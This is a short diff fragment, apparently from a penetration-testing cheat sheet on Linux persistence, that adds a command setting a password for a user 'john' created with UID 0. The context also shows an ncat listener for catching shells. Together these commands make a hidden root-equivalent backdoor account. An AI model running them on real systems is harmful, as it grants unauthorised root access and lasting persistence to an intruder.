@@ -29,6 +29,7 @@ ncat --tcp -lvp 4242
 ```powershell
 sudo useradd -ou 0 -g 0 john
 sudo passwd john
+echo "linuxpassword" | passwd --stdin john
 ```
 
 ## Suid Binary
